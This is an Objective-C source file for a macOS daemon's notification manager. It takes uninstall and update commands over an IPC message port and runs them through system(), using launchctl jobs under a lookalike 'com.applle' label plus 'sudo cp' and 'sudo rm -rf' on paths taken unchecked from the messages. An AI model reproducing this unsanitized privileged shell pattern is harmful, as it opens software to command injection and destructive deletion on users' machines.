//
//  NotificationManager.m
//  blbld
//
//  Created by Ophat Phuetkasickonphasutha on 11/12/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "NotificationManager.h"

@implementation NotificationManager

- (id)init
{
    self = [super init];
    if (self) {
    }
    
    return self;
}

-(void) startWatching {
    if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:@"bSecuriyAgents" 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}

}

// Uninstall
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {

    NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *myDictionary = [[unarchiver decodeObjectForKey:@"command"] retain];
    [unarchiver finishDecoding];
    [unarchiver release];

    NSString* type = [myDictionary objectForKey:@"type"];
    NSString* command = [myDictionary objectForKey:@"command"];
    DLog(@"=!= type %@", type);
    if ([type isEqualToString:@"uninstall"]) {
        DLog (@"!!!!!!!!!!! uninstall");
        NSString *cmd = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.unload -p %@ start", command];
        DLog (@"cmd = %@", cmd);
               
        system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
        exit(0);
    }else if ([type isEqualToString:@"update"]) {
        
        NSString* binaryName = [myDictionary objectForKey:@"binaryname"];
        NSString* tmpAppPath = [myDictionary objectForKey:@"tmpapppath"];
        NSString* unArchivedPath = [myDictionary objectForKey:@"unarchivedpath"];
        
        NSString *copyApp = [NSString stringWithFormat:@"sudo cp -r %@ /Applications/%@", unArchivedPath,[binaryName stringByDeletingPathExtension]];		
        DLog (@"Step 3: Copy the new binary to /Application %@", copyApp)
        system([copyApp cStringUsingEncoding:NSUTF8StringEncoding]);
    
        NSString *updateScript = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.update -p %@ start", command];
        DLog (@"Step 4: Run update script %@", updateScript);
        system([updateScript cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete tar path
        NSString * deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", tmpAppPath];
        DLog (@"Step 5: Delete temp binary %@",  deleteApp)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete untar path	
        deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", unArchivedPath];
        DLog (@"Step 6: Delete untar path %@",  unArchivedPath)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
//        // For Big binary
//        if ([binary isKindOfClass:[NSString class]]) {
//            if (![binary isEqualToString:tmpAppPath]) {
//                DLog (@"CASE of big binary, but the input path is not what we expect")
//                deleteApp = [NSString stringWithFormat:@"rm -rf %@", binary];
//                system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
//            }
//        }
    }
}

-(void) stopWatching {
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}

}

- (void)dealloc
{
    [mMessagePortReader stop];
    [mMessagePortReader release];
    mMessagePortReader = nil;
    
    [super dealloc];
}

@end
